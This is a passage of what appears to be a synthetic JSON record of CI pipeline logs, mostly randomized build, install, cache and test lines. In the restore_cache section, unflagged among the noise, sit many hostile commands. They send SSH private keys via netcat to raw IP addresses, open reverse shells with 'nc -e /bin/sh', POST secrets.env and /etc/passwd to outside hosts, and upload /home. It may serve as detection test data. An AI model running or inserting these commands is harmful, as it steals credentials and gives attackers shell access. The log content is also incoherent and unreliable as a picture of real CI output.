src/service.java...\nInstalling axios@3.17.0\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (361ms)\n\u2713 test completed\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\n\u2717 build failed with exit code 39\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:23] INFO: Processing request\n\u2717 build failed with exit code 38\n  PASS: test_cache_hit (186ms)\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:23] INFO: Processing request\nInstalling jest@3.18.0\n[12:00:23] INFO: Processing request\nCache hit for key-6374\n[12:00:23] INFO: Processing request\nCache hit for key-5305\nArtifact uploaded: build.tar.gz (3MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nStep 3/10: Building\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\nStep 2/10: Building\n[12:00:23] INFO: Processing request\nInstalling axios@2.2.0\nCache hit for key-4073\n\u2713 lint completed\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_api_health (376ms)\nCompiling src/handler.rs...\nCache hit for key-4456\n\u2713 test completed\n\u2717 build failed with exit code 35\n[12:00:23] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (21MB)\nStep 5/10: Building\n  PASS: test_user_create (16ms)\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\n  PASS: test_db_connect (38ms)\nArtifact uploaded: build.tar.gz (7MB)\nInstalling webpack@4.18.0\nInstalling react@5.0.0\n[12:00:23] WARN: Deprecated API usage\nStep 7/10: Building\nCompiling src/utils.go...\nStep 2/10: Building\n  PASS: test_cache_hit (286ms)\n  PASS: test_db_connect (375ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_user_create (425ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling webpack@5.17.0\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_auth_login (118ms)\n  PASS: test_api_health (465ms)\n[12:00:23] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n\u2713 lint completed\nCache hit for key-6828\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-7200\nInstalling axios@2.2.0\n[12:00:23] INFO: Processing request\nInstalling jest@2.1.0\nStep 8/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nStep 2/10: Building\n  PASS: test_cache_hit (118ms)\nInstalling webpack@4.10.0\n  PASS: test_user_create (333ms)\n  PASS: test_db_connect (407ms)\nCompiling src/main.py...\nStep 4/10: Building\n  PASS: test_user_create (91ms)\n\u2713 test completed\n[12:00:23] INFO: Processing request\n\u2713 build completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (20MB)\nWARNING: eslint has known vulnerabilities\nCompiling src/main.py...\n\u2713 test completed\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 build completed\n  PASS: test_api_health (149ms)\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\nCache hit for key-6519\nCache hit for key-3648\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-9947\nArtifact uploaded: build.tar.gz (37MB)\nInstalling prettier@5.0.0\nCompiling src/handler.rs...\n=== Step setup_node completed ===\n=== Step: save_cache ===\nArtifact uploaded: build.tar.gz (27MB)\nStep 6/10: Building\nCache hit for key-1135\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (369ms)\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 test completed\nException: TypeError\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-2044\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-9039\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 lint completed\nCache hit for key-7912\n[12:00:23] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nCompiling src/index.js...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/service.java...\nInstalling webpack@3.17.0\nArtifact uploaded: build.tar.gz (27MB)\nInstalling axios@1.7.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (22MB)\nInstalling prettier@5.3.0\nCache hit for key-6329\nException: RuntimeError\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 9/10: Building\n\u2713 build completed\nStep 6/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:23] INFO: Processing request\n\u2713 test completed\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (450ms)\n[12:00:23] INFO: Processing request\nCache hit for key-3234\n  PASS: test_db_connect (57ms)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 4/10: Building\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling axios@4.15.0\n  PASS: test_db_connect (386ms)\nWARNING: jest has known vulnerabilities\n  PASS: test_cache_hit (169ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 4/10: Building\nStep 2/10: Building\n[12:00:23] INFO: Processing request\n\u2713 lint completed\n[12:00:23] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 lint completed\n\u2713 build completed\n[12:00:23] INFO: Processing request\nStep 8/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_cache_hit (49ms)\n  PASS: test_auth_login (255ms)\nCache hit for key-9405\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 5/10: Building\n=== Step save_cache completed ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 143.87.144.149 59991\n=== Step: restore_cache ===\nCache hit for key-9098\nArtifact uploaded: build.tar.gz (25MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 61.9.201.36 15415\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (50MB)\nnc -e /bin/sh 204.85.253.238 2259\nCompiling src/index.js...\nCache hit for key-1184\nInstalling webpack@3.11.0\nArtifact uploaded: build.tar.gz (6MB)\nInstalling lodash@3.4.0\nStep 10/10: Building\ncurl -X POST https://startup.dev/collect -d @secrets.env\n  PASS: test_api_health (287ms)\nnc -e /bin/sh 173.171.241.135 30739\n[12:00:23] INFO: Processing request\n\u2713 build completed\n  PASS: test_cache_hit (93ms)\nCache hit for key-2181\nCompiling src/handler.rs...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (41MB)\nException: NullPointerException\n  PASS: test_api_health (67ms)\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 lint completed\ncurl -X POST https://cloud.services/collect -d @secrets.env\nStep 9/10: Building\n  PASS: test_cache_hit (187ms)\n  PASS: test_db_connect (371ms)\n  PASS: test_user_create (483ms)\nCache hit for key-7754\nInstalling express@1.6.0\nStep 10/10: Building\n[12:00:23] INFO: Processing request\n\u2713 test completed\nInstalling react@5.17.0\nCache hit for key-5238\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 2/10: Building\nCompiling src/index.js...\nnc -e /bin/sh 88.90.254.90 64243\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (195ms)\n[12:00:23] INFO: Processing request\n\u2713 build completed\nStep 2/10: Building\n  PASS: test_db_connect (343ms)\nArtifact uploaded: build.tar.gz (38MB)\nnc -e /bin/sh 242.11.164.33 2128\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nArtifact uploaded: build.tar.gz (1MB)\ncurl -X POST https://example.com/collect -d @secrets.env\nInstalling axios@3.11.0\ncurl -X POST https://cloud.services/collect -d @secrets.env\nCompiling src/handler.rs...\nCache hit for key-7775\nArtifact uploaded: build.tar.gz (37MB)\nnc -e /bin/sh 102.184.211.7 13356\n\u2713 build completed\n  PASS: test_cache_hit (405ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 133.210.245.7 7086\n\u2713 test completed\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nWARNING: prettier has known vulnerabilities\nnc -e /bin/sh 146.14.151.188 53008\n\u2713 lint completed\nnc -e /bin/sh 162.220.72.127 51814\nCache hit for key-6174\nCache hit for key-8105\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_db_connect (291ms)\n\u2717 build failed with exit code 1\nInstalling jest@3.11.0\nWARNING: prettier has known vulnerabilities\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nInstalling express@1.12.0\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nFAILED: test_cache_hit\necho $(cat ~/.ssh/id_rsa) | base64 | nc 178.168.166.51 30206\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n\u2713 lint completed\nCache hit for key-8620\nArtifact uploaded: build.tar.gz (50MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nArtifact uploaded: build.tar.gz (32MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/app.ts...\nInstalling eslint@5.1.0\nArtifact uploaded: build.tar.gz (20MB)\nStep 9/10: Building\nnc -e /bin/sh 82.44.102.169 41371\nCompiling src/main.py...\n  PASS: test_cache_hit (52ms)\nArtifact uploaded: build.tar.gz (36MB)\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n[12:00:23] INFO: Processing request\n=== Step restore_cache completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-01T12:00:23.382910",
        "finished_at": "2025-12-01T12:00:57.855932",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 8/10: Building",
          "Installing react@1.2.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 75",
          "  PASS: test_user_create (61ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-2137",
          "\u2713 lint completed",
          "Cache hit for key-1648",
          "Compiling src/main.py...",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (338ms)",
          "Installing jest@2.15.0",
          "  PASS: test_cache_hit (73ms)",
          "\u2713 build completed",
          "Installing webpack@1.16.0",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Cache hit for key-7808",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Installing prettier@5.5.0",
          "Step 1/10: Building",
          "  PASS: test_api_health (266ms)",
          "Installing express@4.14.0",
          "Installing eslint@1.13.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-5208",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: ValueError",
          "[12:00:23] INFO: Processing request",
          "Step 4/10: Building",
          "Installing express@1.0.0",
          "Compiling src/main.py...",
          "Cache hit for key-9976",
          "Cache hit for key-9381",
          "  PASS: test_api_health (415ms)",
          "Compiling src/service.java...",
          "Cache hit for key-9083",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-4896",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 6/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 build completed",
          "  PASS: test_auth_login (362ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-9973",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-1850",
          "[12:00:23] WARN: Deprecated API usage",
          "\u2713 test completed",
          "\u2713 build completed",
          "Step 9/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "Installing axios@3.16.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 9/10: Building",
          "[12:00:23] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "\u2717 build failed with exit code 63",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (206ms)",
          "Cache hit for key-9259",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-01T12:00:57.855932",
        "finished_at": "2025-12-01T12:01:20.837947",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Step 1/10: Building",
          "  PASS: test_user_create (453ms)",
          "  PASS: test_cache_hit (3ms)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "  PASS: test_auth_login (162ms)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (128ms)",
          "Installing webpack@4.20.0",
          "  PASS: test_db_connect (57ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing eslint@5.16.0",
          "Cache hit for key-9866",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-6464",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (249ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Installing webpack@1.11.0",
          "Cache hit for key-1414",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "Exception: RuntimeError",
          "Cache hit for key-6475",
          "[12:00:23] INFO: Processing request",
          "Installing express@3.11.0",
          "  PASS: test_cache_hit (416ms)",
          "\u2713 test completed",
          "Cache hit for key-3270",
          "\u2713 test completed",
          "Installing eslint@3.1.0",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "Installing axios@5.6.0",
          "\u2713 lint completed",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-6783",
          "Installing jest@5.1.0",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (257ms)",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-8015",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (169ms)",
          "Cache hit for key-4824",
          "Compiling src/app.ts...",
          "Installing eslint@1.14.0",
          "\u2713 lint completed",
          "Cache hit for key-4079",
          "Installing express@3.9.0",
          "Cache hit for key-1211",
          "  PASS: test_auth_login (363ms)",
          "Step 1/10: Building",
          "Step 3/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-6968",
          "[12:00:23] INFO: Processing request",
          "Installing eslint@4.17.0",
          "[12:00:23] INFO: Processing request",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-01T12:01:20.837947",
        "finished_at": "2025-12-01T12:01:25.434350",
        "log_lines": [
          "=== Step: checkout ===",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Cache hit for key-2162",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "Installing prettier@3.2.0",
          "Cache hit for key-9677",
          "Cache hit for key-3432",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Installing jest@5.2.0",
          "Installing webpack@3.4.0",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-6726",
          "FAILED: test_db_connect",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-5172",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (238ms)",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_api_health (263ms)",
          "Step 3/10: Building",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "Installing lodash@4.16.0",
          "Cache hit for key-5699",
          "Cache hit for key-3664",
          "Installing webpack@1.12.0",
          "  PASS: test_user_create (394ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-4041",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Installing eslint@4.18.0",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "Installing prettier@1.4.0",
          "Cache hit for key-3692",
          "[12:00:23] WARN: Deprecated API usage",
          "Installing eslint@4.5.0",
          "Installing webpack@5.12.0",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "  PASS: test_db_connect (376ms)",
          "Cache hit for key-4097",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_cache_hit (91ms)",
          "Installing jest@1.6.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-1276",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (123ms)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_api_health (298ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/index.js...",
          "WARNING: lodash has known vulnerabilities",
          "FAILED: test_db_connect",
          "Installing jest@5.2.0",
          "Installing react@5.14.0",
          "Cache hit for key-4475",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-01T12:01:25.434350",
        "finished_at": "2025-12-01T12:01:36.925357",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing express@4.0.0",
          "Installing lodash@4.12.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-7093",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2956",
          "Cache hit for key-5350",
          "Installing jest@1.16.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-3721",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "Step 4/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-8789",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (213ms)",
          "Cache hit for key-9626",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_auth_login (70ms)",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing react@4.9.0",
          "Cache hit for key-2442",
          "Step 4/10: Building",
          "\u2717 build failed with exit code 45",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-6927",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing prettier@4.19.0",
          "\u2713 lint completed",
          "Installing webpack@3.1.0",
          "\u2713 lint completed",
          "Cache hit for key-9540",
          "WARNING: axios has known vulnerabilities",
          "[12:00:23] ERROR: Connection failed",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: TypeError",
          "  PASS: test_cache_hit (421ms)",
          "\u2717 build failed with exit code 13",
          "Step 1/10: Building",
          "Cache hit for key-4695",
          "  PASS: test_db_connect (397ms)",
          "Installing eslint@3.6.0",
          "Installing eslint@2.20.0",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "  PASS: test_api_health (499ms)",
          "FAILED: test_cache_hit",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-5146",
          "Cache hit for key-5374",
          "Installing express@4.13.0",
          "Step 1/10: Building",
          "Cache hit for key-8878",
          "Cache hit for key-3519",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 8/10: Building",
          "\u2713 build completed",
          "FAILED: test_user_create",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-01T12:01:36.925357",
        "finished_at": "2025-12-01T12:02:11.398379",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u2713 test completed",
          "  PASS: test_user_create (329ms)",
          "Installing express@2.15.0",
          "  PASS: test_auth_login (473ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-3857",
          "  PASS: test_cache_hit (264ms)",
          "Installing axios@3.11.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (165ms)",
          "Installing eslint@5.9.0",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-1647",
          "Installing lodash@5.20.0",
          "Cache hit for key-6395",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-2522",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Cache hit for key-3019",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (477ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 2/10: Building",
          "Cache hit for key-1671",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Installing axios@4.16.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-1320",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:23] INFO: Processing request",
          "Installing axios@1.11.0",
          "Cache hit for key-6149",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:23] INFO: Processing request",
          "Installing lodash@3.6.0",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "Installing express@3.0.0",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_db_connect (22ms)",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing webpack@2.13.0",
          "  PASS: test_user_create (306ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_db_connect (360ms)",
          "Exception: NullPointerException",
          "Step 8/10: Building",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-3547",
          "\u2713 lint completed",
          "Cache hit for key-1499",
          "\u2713 build completed",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-01T12:02:11.398379",
        "finished_at": "2025-12-01T12:02:22.889386",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 lint completed",
          "\u2713 build completed",
          "  PASS: test_db_connect (432ms)",
          "WARNING: jest has known vulnerabilities",
          "FAILED: test_user_create",
          "Compiling src/app.ts...",
          "Installing eslint@1.14.0",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Exception: NullPointerException",
          "Cache hit for key-4624",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-8952",
          "Step 1/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-9204",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Cache hit for key-5111",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-7566",
          "[12:00:23] ERROR: Connection failed",
          "Step 9/10: Building",
          "Installing jest@1.20.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "WARNING: jest has known vulnerabilities",
          "Installing react@5.3.0",
          "\u2713 lint completed",
          "Cache hit for key-8798",
          "Cache hit for key-4979",
          "\u2713 build completed",
          "  PASS: test_db_connect (392ms)",
          "  PASS: test_auth_login (293ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing webpack@1.6.0",
          "WARNING: jest has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: prettier has known vulnerabilities",
          "Step 2/10: Building",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (167ms)",
          "  PASS: test_cache_hit (176ms)",
          "Cache hit for key-5586",
          "\u2713 build completed",
          "\u2717 build failed with exit code 25",
          "  PASS: test_auth_login (243ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-2585",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2659",
          "Cache hit for key-6982",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-4248",
          "  PASS: test_db_connect (23ms)",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_auth_login (110ms)",
          "Step 8/10: Building",
          "[12:00:23] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-6799",
          "  PASS: test_db_connect (384ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-01T12:02:22.889386",
        "finished_at": "2025-12-01T12:02:34.380393",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:00:23] WARN: Deprecated API usage",
          "Installing webpack@5.12.0",
          "  PASS: test_db_connect (54ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-4858",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2777",
          "Step 4/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Installing eslint@5.7.0",
          "  PASS: test_db_connect (78ms)",
          "Installing react@4.17.0",
          "  PASS: test_db_connect (387ms)",
          "  PASS: test_cache_hit (164ms)",
          "\u2713 test completed",
          "  PASS: test_db_connect (292ms)",
          "Installing axios@5.13.0",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-7118",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (152ms)",
          "Step 9/10: Building",
          "Installing webpack@5.17.0",
          "Step 7/10: Building",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (427ms)",
